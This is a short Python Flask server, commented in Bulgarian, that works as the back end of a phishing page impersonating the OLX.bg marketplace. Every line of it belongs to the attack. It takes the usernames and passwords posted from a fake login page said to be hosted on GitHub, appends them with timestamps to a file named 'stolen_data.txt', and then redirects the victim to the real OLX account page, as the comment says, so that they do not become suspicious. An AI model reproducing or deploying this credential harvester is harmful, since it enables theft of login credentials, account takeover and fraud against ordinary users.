from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    # Вземаме данните, които идват от GitHub страницата
    user = request.form.get('username')
    pw = request.form.get('password')
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Записваме ги в текстов файл
    with open("stolen_data.txt", "a", encoding="utf-8") as f:
        f.write(f"[{now}] User: {user} | Pass: {pw}\n")
    
    print(f"[*] Получени данни: {user}")

    # Пренасочваме жертвата към истинския сайт на OLX, за да не се усъмни
    return redirect("https://www.olx.bg/myaccount/")

if __name__ == '__main__':
    # Сървърът слуша на порт 8080
    app.run(host='0.0.0.0', port=8080)